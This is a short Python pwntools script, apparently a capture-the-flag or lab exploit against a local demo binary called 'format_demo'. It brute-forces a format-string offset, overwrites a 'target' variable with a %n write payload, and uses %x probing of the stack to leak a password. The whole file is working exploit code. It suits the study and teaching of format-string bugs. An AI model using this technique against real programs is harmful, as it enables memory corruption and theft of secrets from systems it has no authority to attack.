from pwn import *

context.log_level = 'error'

# change the target variable
if args.TARGET:
    for i in range(30):
        p = process('./format_demo')

        p.sendline(f'AAAA%{i}$x'.encode())
        output = p.recvline().decode('utf-8').strip()

        p.close()

        if '41414141' in output:
            offset = i
            break
    else:
        print('target not found idiot')
        exit()

    p = process('./format_demo')
    e = p.elf

    # A note about formatting stuff with python3 fstrings lol
    # p32(0x12345678) => b'\x78\x56\x34\x12'
    # so: f'{p32(e.symbols["target"])}%{offset}$n'.encode() => b'b"\x78\x56\x34\x12"%22$n'
    # which doesn't work because of the additional b"" lol
    p.sendline(p32(e.symbols["target"]) + f'%{offset}$n'.encode())

    p.interactive()
    p.close()

# leak the password
else:
    for i in range(50):
        try:
            p = process('./format_demo')
            
            p.sendline('AAAABBBB %{}$x'.format(i)) # replace %x with %s to find the actual values
            p.recvuntil('AAAABBBB ')
            print('{}: {}'.format(i, p.recvline(timeout=0.5).strip().decode()))

            p.close()
        except:
            pass